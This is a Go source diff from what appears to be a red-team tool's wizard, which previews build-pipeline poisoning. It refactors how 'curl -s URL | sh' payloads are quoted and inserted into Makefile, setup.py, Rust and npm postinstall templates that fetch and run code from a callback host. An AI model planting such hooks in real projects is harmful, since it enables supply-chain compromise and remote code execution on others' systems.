@@ -2213,9 +2213,10 @@ func (m *Model) buildWizardStep3LOTP(width int) []string {
 		boxPad = ""
 	}
 	if isDynamicScript && len(targets) > 0 {
+		curlCmd := lotpPreviewCurlPipeShCommand(callbackURL)
 		for _, target := range targets {
 			lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, innerWidth, target, []string{
-				warningColor.Render("curl -s " + callbackURL + " | sh"),
+				warningColor.Render(curlCmd),
 				"... (rest of existing script) ...",
 			})...)
 		}
@@ -2287,17 +2288,21 @@ func renderPreviewBoxContent(maxWidth int, content string) string {
 }
 
 func lotpDefaultPreview(tool, callbackURL string) string {
-	cb := callbackURL
+	curlCmd := lotpPreviewCurlPipeShCommand(callbackURL)
 	switch tool {
 	case "make":
-		return ".PHONY: all\nall:\n\t@curl -s " + cb + " | sh\n\t@$(MAKE) -f Makefile.real all"
+		return ".PHONY: all\nall:\n\t@" + curlCmd + "\n\t@$(MAKE) -f Makefile.real all"
 	case "pip":
-		return "from setuptools import setup\nimport os\nos.system(\"curl -s " + cb + "|sh\")\nsetup(name='pkg', version='1.0.0')"
+		return "from setuptools import setup\nimport os\nos.system(" + fmt.Sprintf("%q", curlCmd) + ")\nsetup(name='pkg', version='1.0.0')"
 	case "cargo":
-		return "fn main() {\n  std::process::Command::new(\"sh\")\n    .arg(\"-c\").arg(\"curl -s " + cb + "|sh\")\n    .output();\n}"
+		return "fn main() {\n  std::process::Command::new(\"sh\")\n    .arg(\"-c\").arg(" + fmt.Sprintf("%q", curlCmd) + ")\n    .output();\n}"
 	default:
-		return "{\n  \"name\": \"build-tools\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"postinstall\": \"curl -s " + cb + "|sh\"\n  }\n}"
+		return "{\n  \"name\": \"build-tools\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"postinstall\": " + fmt.Sprintf("%q", curlCmd) + "\n  }\n}"
 	}
+}
+
+func lotpPreviewCurlPipeShCommand(callbackURL string) string {
+	return fmt.Sprintf("curl -s '%s' | sh", strings.ReplaceAll(callbackURL, "'", "'\"'\"'"))
 }
 
 func formatWizardContent(prefix, label, value string, width int) string {
